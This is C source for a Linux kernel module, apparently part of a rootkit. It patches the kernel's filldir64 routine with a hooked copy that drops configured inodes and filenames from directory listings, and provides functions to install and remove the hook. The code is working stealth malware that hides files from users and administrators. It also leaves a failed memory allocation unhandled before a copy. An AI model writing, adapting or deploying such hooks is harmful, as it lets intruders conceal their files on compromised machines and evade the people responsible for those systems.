#include <linux/types.h>
#include <linux/kernel.h>
#include <linux/string.h>
#include <linux/dirent.h>
#include <linux/slab.h>

#include "license.h"
#include "ksyms.h"
#include "config.h"
#include "common.h"
#include "hook.h"

#define unsafe_copy_dirent_name(_dst, _src, _len, label) do {   \
    char __user *dst = (_dst);                                  \
    const char *src = (_src);                                   \
    size_t len = (_len);                                        \
    unsafe_put_user(0, dst+len, label);                         \
    unsafe_copy_to_user(dst, src, len, label);                  \
} while (0)

struct getdents_callback64 {
    struct dir_context ctx;
    struct linux_dirent64 __user * current_dir;
    int prev_reclen;
    int count;
    int error;
};

static int filldir64_hook(struct dir_context *ctx, const char *name, int namlen,
                          loff_t offset, u64 ino, unsigned int d_type) {
    /* original filldir64 code */    

    struct linux_dirent64 __user *dirent, *prev;
    struct getdents_callback64 *buf = container_of(ctx, struct getdents_callback64, ctx);
    int reclen = ALIGN(offsetof(struct linux_dirent64, d_name) + namlen + 1, sizeof(u64));
    int prev_reclen;

    /* hook code */

    int i;

    // hide configured inodes
    for (i = 0; i < hide_inodes_count; i++) {
        if (ino == hide_inodes[i])
            return 0;
    }

    // hide configured filenames (not full paths)
    for (i = 0; i < hide_filenames_count; i++) {
        if (!strncmp(name, hide_filenames[i], namlen))
            return 0;
    }

    /* original filldir64 code */

    buf->error = verify_dirent_name(name, namlen);
    if (unlikely(buf->error))
        return buf->error;
    buf->error = -EINVAL;
    if (reclen > buf->count)
        return -EINVAL;
    prev_reclen = buf->prev_reclen;
    if (prev_reclen && signal_pending(current))
        return -EINTR;
    dirent = buf->current_dir;
    prev = (void __user *)dirent - prev_reclen;
    if (!user_write_access_begin(prev, reclen + prev_reclen))
        goto efault;

    unsafe_put_user(offset, &prev->d_off, efault_end);
    unsafe_put_user(ino, &dirent->d_ino, efault_end);
    unsafe_put_user(reclen, &dirent->d_reclen, efault_end);
    unsafe_put_user(d_type, &dirent->d_type, efault_end);
    unsafe_copy_dirent_name(dirent->d_name, name, namlen, efault_end);
    user_write_access_end();

    buf->prev_reclen = reclen;
    buf->current_dir = (void __user *)dirent + reclen;
    buf->count -= reclen;
    return 0;

efault_end:
    user_write_access_end();
efault:
    buf->error = -EFAULT;
    return -EFAULT;
}

static struct view filldir64_restore = {0};

void hide_set_filldir64(void) {
    struct view restore;

    // only set if not previously set
    if (filldir64_restore.ptr != NULL)
        return;
    
    restore = hook_set((void *)filldir64, &filldir64_hook);

    filldir64_restore.ptr = kmalloc(restore.size, GFP_KERNEL);
    if (!filldir64_restore.ptr) {
        /* well */
    }

    filldir64_restore.size = restore.size;

    memcpy(filldir64_restore.ptr, restore.ptr, restore.size);
}

void hide_unset_filldir64(void) {
    // only unset if previously set
    if (filldir64_restore.ptr == NULL)
        return;
    
    hook_unset((void *)filldir64, filldir64_restore);
    kfree(filldir64_restore.ptr);
    
    // reset view so on next hook_set kmalloc will be called
    filldir64_restore.ptr = 0;
    filldir64_restore.size = 0;
}
